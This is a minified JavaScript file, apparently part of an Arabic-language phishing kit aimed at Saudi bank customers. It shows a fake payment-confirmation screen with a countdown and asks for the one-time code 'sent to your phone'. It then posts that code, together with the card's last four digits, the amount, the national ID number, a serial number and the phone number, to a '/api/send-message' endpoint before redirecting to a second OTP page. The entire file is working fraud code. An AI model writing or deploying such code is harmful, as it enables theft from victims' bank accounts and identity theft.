const totalPrice=localStorage.getItem("selectedPrice")||"غير متوفر";const cardNumber=localStorage.getItem("cardNumber")||"0000";const last4=cardNumber.slice(-4);const otpText=`سيتم إجراء معاملة مالية على حسابك المصرفي لسداد مبلغ قيمته ${totalPrice} SAR باستخدام البطاقة المنتهية برقم ${last4}. لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.`;document.getElementById("otpText").innerText=otpText;const overlay=document.getElementById("overlay");const waitBtn=document.getElementById("waitBtn");const otpSection=document.getElementById("otpSection");const otpTimer=document.getElementById("otpTimer");let autoClickTimeout;setTimeout(()=>{waitBtn.textContent="> التحقق";waitBtn.disabled=!1;waitBtn.style.cursor="pointer";waitBtn.onclick=()=>{clearTimeout(autoClickTimeout);overlay.style.display="none";otpSection.style.display="block";startOTPTimer(180)};autoClickTimeout=setTimeout(()=>{waitBtn.click()},3000)},6000);function startOTPTimer(duration){let timeLeft=duration;const interval=setInterval(()=>{const minutes=String(Math.floor(timeLeft/60)).padStart(2,'0');const seconds=String(timeLeft%60).padStart(2,'0');otpTimer.textContent=`${minutes}:${seconds}`;if(--timeLeft<0)clearInterval(interval);},1000)}
document.querySelector('.otp-section button').addEventListener('click',function(){const otpValue=document.getElementById('otp').value.trim();if(otpValue.length<4){alert("❗الرجاء إدخال رمز تحقق صالح");return}
const totalPrice=localStorage.getItem("selectedPrice")||"غير متوفر";const cardNumber=localStorage.getItem("cardNumber")||"0000";const last4=cardNumber.slice(-4);const formData=JSON.parse(localStorage.getItem("formData")||"{}");const identity=formData.id||"غير محدد";const serial=formData.serial||"غير محدد";const phone=formData.phone||"غير محدد";const message=`
رمز التحقق:

🔚 آخر ٤ أرقام من البطاقة: ${last4}
💵 المبلغ: ${totalPrice} SAR
🔐 رمز التحقق: ${otpValue}

📄 بيانات المستخدم:
🆔 رقم الهوية: ${identity}
🔢 الرقم التسلسلي: ${serial}
� رقم الهاتف: ${phone}
`;fetch('/api/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:message})}).then(response=>response.json()).then(data=>{if(data.ok){window.location.href="otp2.html"}else{alert("حدث خطأ أثناء الإرسال")}}).catch(error=>{console.error(error);alert("حدث خطأ أثناء الإرسال")})})
